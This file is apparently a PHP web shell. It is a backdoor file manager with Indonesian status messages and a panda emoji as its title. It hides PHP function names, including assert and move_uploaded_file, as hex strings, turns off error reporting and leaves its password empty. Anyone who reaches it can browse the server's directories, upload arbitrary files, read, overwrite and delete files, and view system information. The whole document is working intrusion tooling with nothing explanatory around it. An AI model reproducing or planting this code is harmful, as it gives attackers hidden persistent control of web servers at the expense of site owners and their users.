<?php
$password = ""; // hadeh 

session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);


$Array = [
		'7068705f756e616d65',
		'70687076657273696f6e',
		'6368646972',
		'676574637764',
		'707265675f73706c6974',
		'636f7079',
		'66696c655f6765745f636f6e74656e7473',
		'6261736536345f6465636f6465',
		'69735f646972',
		'6f625f656e645f636c65616e28293b',
		'756e6c696e6b',
		'6d6b646972',
		'63686d6f64',
		'7363616e646972',
		'7374725f7265706c616365',
		'68746d6c7370656369616c6368617273',
		'7661725f64756d70',
		'666f70656e',
		'667772697465',
		'66636c6f7365',
		'64617465',
		'66696c656d74696d65',
		'737562737472',
		'737072696e7466',
		'66696c657065726d73',
		'746f756368',
		'66696c655f657869737473',
		'72656e616d65',
		'69735f6172726179',
		'69735f6f626a656374',
		'737472706f73',
		'69735f7772697461626c65',
		'69735f7265616461626c65',
		'737472746f74696d65',
		'66696c6573697a65',
		'726d646972',
		'6f625f6765745f636c65616e',
		'7265616466696c65',
		'617373657274',
		'66696c655f7075745f636f6e74656e7473',
		'6d6f76655f75706c6f616465645f66696c65',
];
$___ = count($Array);
for($i=0;$i<$___;$i++) {
	$GNJ[] = uhex($Array[$i]);
}


$leaf['version']="0.1";
$leaf['website']="https://www.facebook.com/cocoseakanakan/";


$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    # _REQUEST mean _POST or _GET 
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>";
        exit;        
    }
}

$dir = isset($_GET['dir']) ? hex2bin($_GET['dir']) : '.';
$files = scandir($dir);
$upload_message = '';
$edit_message = '';
$delete_message = '';

function get_file_permissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function is_writable_permission($file) {
    return is_writable($file);
}

if (isset($_FILES['file_upload'])) {
	$namak = $_FILES['file_upload']['name'];
	$tempat = $_FILES['file_upload']['tmp_name'];
    if ($GNJ[40]($tempat, $dir . '/' .$namak )) {
        $upload_message = 'File berhasil diunggah.';
    } else {
        $upload_message = 'Gagal mengunggah file.';
    }
}

if (isset($_POST['edit_file'])) {
    $file = $_POST['edit_file'];
    $content = $GNJ[6]($file); // membaca isi file yang ingin diedit
    if ($content !== false) {
        echo '<hr><form method="post" action="">'; // buat form baru untuk menampilkan textarea dan tombol Submit
        echo '<textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control">' . htmlspecialchars($content) . '</textarea>';
        echo '<input type="hidden" name="edited_file" value="' . htmlspecialchars($file) . '"><br>';
        echo '<button type="submit" name="submit_edit" class="btn btn-outline-light">Submit</button><hr>';
        echo '</form>';
    } else {
        $edit_message = 'Gagal membaca isi file.';
    }
}

if (isset($_POST['submit_edit'])) {
    $file = $_POST['edited_file'];
    $content = $_POST['file_content'];
    if ($GNJ[39]($file, $content) !== false) {
        $edit_message = 'File berhasil diedit.';
    } else {
        $edit_message = 'Gagal mengedit file.';
    }
}

if (isset($_POST['delete_file'])) {
    $file = $_POST['delete_file'];
    if ($GNJ[10]($file)) {
        $delete_message = 'File berhasil dihapus.';
    } else {
        $delete_message = 'Gagal menghapus file.';
    }
}

$uname = php_uname();
$current_dir = realpath($dir);
?>

<!DOCTYPE html>
<html>
<head>
    <title>🐼</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        header {
            background-color: #252624;
            color: white;
            padding: 1rem;
        }
        header h1 {
            margin: 0;
        }
        main {
            padding: 1rem;
        }
        table {
            border-collapse: collapse;
            margin: 1rem auto;
            width: 50%;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 0.5rem;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        tr:hover {
            background-color: #ddd;
        }
        form {
            display: inline-block;
            margin: 1rem 0;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <header>
        <h1>🐼</h1>
    </header>
    <main>
        <p>Current directory: <?php echo $current_dir; ?></p>
        <p>Server information: <?php echo $uname; ?></p>
        <?php if (!empty($upload_message)): ?>
        <p><?php echo $upload_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($edit_message)): ?>
        <p><?php echo $edit_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($delete_message)): ?>
        <p><?php echo $delete_message; ?></p>
        <?php endif; ?>
        <form method="POST" enctype="multipart/form-data">
            <label>Upload file:</label>
            <input type="file" name="file_upload">
            <input type="submit" value="Upload">
            <input type="hidden" name="dir" value="<?php echo $dir; ?>">
        </form>
        <table>
            <tr>
                <th>Filename</th>
                <th>Permissions</th>
                <th>Actions</th>
</tr>
<?php foreach ($files as $file): ?>
<tr>
    <td>
        <?php if (is_dir($dir . '/' . $file)): ?>
        <a href="?dir=<?php echo bin2hex($dir . '/' . $file); ?>"
            style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
        <?php else: ?>
        <span style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></span>
        <?php endif; ?>
    </td>
    <td style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'green' : 'red'; ?>">
        <?php echo is_file($dir . '/' . $file) ? get_file_permissions($dir . '/' . $file) : (is_writable_permission($dir . '/' . $file) ? 'Directory' : 'Directory (No writable)'); ?>
    </td>
    <td>
        <?php if (is_file($dir . '/' . $file)): ?>
        <form action="" method="post" style="display: inline-block;">
            <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
            <button type="submit" class="btn btn-outline-light">Edit</button>
        </form>
        <form action="" method="post" style="display: inline-block;">
            <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
            <button type="submit" class="btn btn-outline-light">Delete</button>
        </form>
        <?php endif; ?>
    </td>
</tr>
<?php endforeach; ?>
</table>
</main>
</body>
</html>
